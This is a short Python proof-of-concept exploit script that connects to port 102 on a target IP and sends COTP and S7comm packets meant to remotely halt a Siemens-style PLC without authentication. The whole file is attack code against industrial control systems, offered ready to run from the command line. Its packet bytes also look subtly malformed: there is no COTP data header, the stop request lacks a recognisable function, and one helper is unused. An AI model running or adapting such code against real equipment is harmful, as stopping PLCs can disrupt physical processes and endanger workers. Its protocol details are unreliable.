"""
S7COMM PoC: 远程 STOP PLC (无认证漏洞)
"""
import socket, struct, sys

TPKT = struct.Struct(">BBH")
COTP_CR = bytes([0x11, 0xe0, 0x00, 0x00, 0x00, 0x01, 0x00, 0xc0, 0x01, 0x0a, 0xc1, 0x02, 0x01, 0x02, 0xc2, 0x02, 0x01, 0x00])

def tpkt(p): return TPKT.pack(3, 0, 4 + len(p)) + p

def s7_req(func, data):
    """Build S7 request with given function code."""
    body = bytearray([0x32, func, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
    return body + data

def exploit(host, port=102):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10); sock.connect((host, port))

    # 1. COTP Connection
    sock.sendall(tpkt(COTP_CR))
    resp = sock.recv(1024)
    if resp[5] != 0xd0:
        print("[-] COTP connection failed"); sock.close(); return
    print("[+] COTP Connection established")

    # 2. S7 Setup
    setup = bytes([0x32, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00,
                   0x00, 0x00, 0x00, 0x01, 0x00, 0xf0, 0x00, 0x00, 0x00, 0x01, 0x00, 0xf0])
    sock.sendall(tpkt(setup))
    resp = sock.recv(1024)
    if len(resp) > 6 and resp[5] in (0xf0, 0x10):
        print("[+] S7 Setup Communication OK")
    else:
        print(f"[?] Setup response: {resp.hex()}")

    # 3. STOP PLC
    stop = bytes([0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
                  0x00, 0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00])
    sock.sendall(tpkt(stop))
    resp = sock.recv(1024)
    if len(resp) > 8 and resp[8] == 0x80:
        print("[!] PLC STOP acknowledged (returned 0x80)")
    else:
        print(f"[?] STOP response: {resp.hex()}")
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python poc/plc_stop.py <target_ip> [port]"); sys.exit(1)
    exploit(sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 102)
